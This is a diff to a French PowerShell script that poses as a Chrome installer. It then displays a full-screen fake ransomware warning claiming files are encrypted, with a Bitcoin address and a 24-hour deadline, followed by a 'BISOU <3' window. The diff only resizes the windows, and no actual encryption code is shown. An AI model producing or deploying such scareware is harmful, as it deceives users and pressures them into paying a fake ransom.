@@ -1,5 +1,9 @@
 Add-Type -AssemblyName PresentationFramework
 
+# Récupérer la taille de l'écran
+$screenWidth = [System.Windows.SystemParameters]::PrimaryScreenWidth
+$screenHeight = [System.Windows.SystemParameters]::PrimaryScreenHeight
+
 # Premier pop-up classique
 [System.Windows.MessageBox]::Show('Installation de Chrome... TERMINE', 'Information', 'OK', 'Information')
 
@@ -11,8 +15,9 @@ $warningWindow.Content = "TOUS VOS FICHIERS SONT CHIFFRES !`n`n" +
                          "Mon adresse BTC : 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A.`n`n" +
                          "DELAI RESTANT : 24 HEURES SOUS PEINE DE PERDRE VOS FICHIERS DEFINITIVEMENT"
 $warningWindow.FontSize = 32
-$warningWindow.Width = 700
-$warningWindow.Height = 400
+# Adapter la taille de la fenêtre en fonction de la taille de l'écran
+$warningWindow.Width = $screenWidth * 0.7  # 70% de la largeur de l'écran
+$warningWindow.Height = $screenHeight * 0.5  # 50% de la hauteur de l'écran
 $warningWindow.WindowStartupLocation = 'CenterScreen'
 $warningWindow.Topmost = $true
 $warningWindow.Background = 'Red'
@@ -24,8 +29,9 @@ $window = New-Object Windows.Window
 $window.Title = 'ALERTE SECURITE'
 $window.Content = 'BISOU <3'
 $window.FontSize = 48
-$window.Width = 800
-$window.Height = 400
+# Adapter la taille de la fenêtre en fonction de la taille de l'écran
+$window.Width = $screenWidth * 0.8  # 80% de la largeur de l'écran
+$window.Height = $screenHeight * 0.5  # 50% de la hauteur de l'écran
 $window.WindowStartupLocation = 'CenterScreen'
 $window.Topmost = $true
 $window.Background = 'Red'
